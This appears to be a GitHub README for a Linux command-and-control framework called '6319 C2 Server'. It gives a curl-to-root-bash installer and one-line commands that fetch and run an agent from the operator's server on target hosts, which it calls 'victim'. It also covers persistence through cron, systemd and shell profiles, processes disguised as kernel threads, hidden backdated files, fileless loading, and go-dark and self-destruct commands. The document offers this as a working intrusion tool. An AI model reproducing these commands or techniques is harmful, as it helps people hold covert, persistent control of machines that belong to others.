# 6319 C2 Server v3.2

Stealth C2 with end-to-end encryption, multi-channel architecture, and process masking.

## Quick Install (Any Linux VPS)

```bash
curl -fsSL https://raw.githubusercontent.com/44pie/6319/main/install.sh | sudo bash
```

The installer will:
- Auto-detect your Linux distribution
- Install all dependencies (Python, Flask, NaCl)
- Generate random ports (5000-9000 range)
- Generate random deploy paths (9-char alphanumeric)
- Generate a secure 40-character access key
- Configure firewall rules
- Create systemd service

## Features

| Feature | Description |
|---------|-------------|
| **One-line Install** | Fully autonomous setup with random config |
| **Multi-Channel** | STEALTH + PERSIST from same host |
| **Multi-User System** | Role-based access with per-user deploy paths |
| **End-to-end Encryption** | NaCl SecretBox (XSalsa20-Poly1305) |
| **Key-based Auth** | Secure web UI access |
| **Interactive PTY** | Full terminal via xterm.js |
| **Process Masking** | Kernel-like process names |
| **File Manager** | b374k-style with exec-based operations |
| **Database Manager** | Adminer integration |
| **Webhook Alerts** | Telegram & Discord notifications |

## Security Model

| Endpoint Type | Authentication |
|---------------|----------------|
| Web UI (`/`) | Required (AUTH_KEY) |
| API (`/api/*`) | Required (AUTH_KEY) |
| Deploy (`/stealth`, `/x`, custom) | None (by design) |
| Uninstall (`/uninstall`) | None |

Deploy endpoints are intentionally unauthenticated to allow agent installation without credentials.

## Deploy Commands

After installation, the server displays ready-to-use commands with your randomized paths:

### Stealth (In-memory, no persistence)
```bash
bash -c "$(curl -fsSL http://YOUR_IP:PORT/RANDOM_PATH)"
```

### Persist (Hidden files, survives reboot)
```bash
bash -c "$(curl -fsSL http://YOUR_IP:PORT/RANDOM_PATH)"
```

## Architecture

```
                    ┌──────────────────────────┐
                    │    6319 C2 Server v3.2   │
                    │  Flask + SocketIO + NaCl │
                    └───────────┬──────────────┘
                                │
         ┌──────────────────────┼──────────────────────┐
         │                      │                      │
    Random Port            Random Port            Webhooks
    (HTTP/WS)              (Encrypted C2)         (TG/Discord)
         │                      │                      │
   ┌─────┴─────┐          ┌─────┴─────┐          ┌─────┴─────┐
   │  Web UI   │          │  Agents   │          │  Notify   │
   │  xterm.js │          │ STEALTH   │          │  connect/ │
   │  Auth Key │          │ PERSIST   │          │  beacon   │
   └───────────┘          └───────────┘          └───────────┘
```

## Multi-Channel Architecture

A single host can have multiple channels:

| Channel | Behavior |
|---------|----------|
| **STEALTH** | In-memory only, no disk writes, lost on reboot |
| **PERSIST** | Hidden files, cron/systemd persistence, survives reboot |

Each channel has independent:
- Connection status (ONLINE, BEACON, SLEEPING, DARK)
- PTY sessions
- Command history

## Agent Statuses

| Status | Description |
|--------|-------------|
| 🟢 ONLINE | Active session, executing commands |
| 🔵 BEACON | Periodic check-ins, no active session |
| 🟡 SLEEPING | Commanded sleep, no beacons |
| ⚫ DARK | No beacons (go_dark or lost) |

## Stealth Commands

| Command | Description |
|---------|-------------|
| `connect` | Queue wake signal for next beacon |
| `disconnect` | End session, return to beacon mode |
| `sleep <min>` | Sleep for N minutes (no beacons) |
| `go_dark <hrs>` | Complete radio silence for N hours |
| `self_destruct` | Kill processes, wipe files, exit |
| `ping_all` | Check all agents from cache |

## Multi-User System

| Feature | Description |
|---------|-------------|
| **Role-based Access** | Admin has full access, operators see only shared hosts |
| **Per-user Deploy Paths** | Each user gets unique stealth/persist endpoints |
| **Per-user Ports** | Random ports (5000-9000) for each operator |
| **Host Sharing** | Admin can grant/revoke access to specific hosts |
| **Browser Tabs UI** | Switch between users with tab interface |
| **User Management** | Create, rename, delete users via modal |

### User Types

| Role | Capabilities |
|------|--------------|
| **Admin** | Full access to all hosts, user management |
| **Operator** | View shared hosts only, execute commands |

## Files

```
6319/
├── server.py              # C2 server with multi-channel
├── agent_stealth.py       # Python agent (unified)
├── crypto.py              # NaCl encryption module
├── webhooks.py            # Telegram/Discord notifications
├── memfd_loader.py        # Python fileless loader
├── install.sh             # Autonomous VPS installer
├── users.json             # User database (auto-created)
├── bin/
│   ├── agent_linux_amd64  # Go agent x86_64
│   └── agent_linux_arm64  # Go agent ARM64
├── templates/
│   ├── index.html         # Web interface
│   └── login.html         # Auth page
└── static/
    └── style.css          # Nordic theme
```

## Environment Variables

| Variable | Description | Generated |
|----------|-------------|-----------|
| `C2_WEB_PORT` | HTTP/WebSocket port | Random 5000-9000 |
| `C2_SOCKET_PORT` | Encrypted agent port | WEB_PORT + 1 |
| `STEALTH_PATH` | Stealth deploy endpoint | Random 9 chars |
| `PERSIST_PATH` | Persist deploy endpoint | Random 9 chars |
| `AUTH_KEY` | Web UI access key | Random 40 chars |
| `SESSION_SECRET` | Flask session secret | Random 64 hex |

## Webhook Notifications

### Telegram
```bash
export TELEGRAM_BOT_TOKEN="5794110125:AAFDNb..."
export TELEGRAM_CHAT_ID="-8834838..."
```

### Discord
```bash
export DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/..."
```

## Encryption

All agent traffic is encrypted using NaCl SecretBox:
- **Algorithm**: XSalsa20-Poly1305 (authenticated encryption)
- **Key derivation**: SHA256 from shared secret
- **Nonce**: Random 24 bytes per message
- **Frame format**: [4 bytes length][encrypted payload]

## Stealth Features

### Process Masking
- `prctl(PR_SET_NAME)` to kernel-like names: `[kworker/0:0]`, `[ksmd]`
- `/proc/self/comm` write for complete hiding
- Double-fork daemonization

### Hidden Installation (PERSIST)
- Directory: `~/.config/.htop/` (random from pool)
- Binary: `.defunct` (hidden, timestamped)
- Permissions: 600/700
- Timestamps: Backdated 180+ days

### Persistence Methods
1. Cron: `@reboot` + `*/5 * * * *` watchdog
2. Systemd user service (if available)
3. Shell profiles (`.bashrc`, `.profile`)

## Management

```bash
# View service status
systemctl status 6319-c2

# View logs
journalctl -u 6319-c2 -f

# Restart service
systemctl restart 6319-c2

# View configuration
cat /opt/6319/.env
```

## Uninstall

### From Agent (victim)
```bash
bash -c "$(curl -fsSL http://server/uninstall)"
```

### From Server
```bash
systemctl stop 6319-c2
systemctl disable 6319-c2
rm -rf /opt/6319
rm /etc/systemd/system/6319-c2.service
systemctl daemon-reload
```
